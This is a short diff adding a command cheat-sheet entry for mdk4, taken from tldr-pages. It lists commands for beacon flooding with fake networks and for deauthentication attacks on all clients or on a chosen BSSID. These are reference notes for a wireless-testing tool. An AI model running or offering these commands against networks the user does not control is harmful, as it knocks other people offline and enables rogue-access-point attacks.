@@ -1,0 +1,13 @@
+; This has been extracted from
+; https://github.com/tldr-pages/tldr/blob/master/pages/common/mdk4.md
+
+% mdk4, common
+
+# Flood access points with beacon frames to create fake networks (set interface to monitor mode with `sudo airmon-ng start <wifi_interface>` if needed)
+sudo mdk4 <wifi_interface> b -f <path_to_beacons_txt>
+
+# Perform deauthentication attack against all clients on all BSSIDs
+sudo mdk4 <wifi_interface> d
+
+# Perform deauthentication attack on a specific BSSID (list BSSIDs using `sudo airodump-ng <wifi_interface>`)
+sudo mdk4 <wifi_interface> d -B <BSSID>
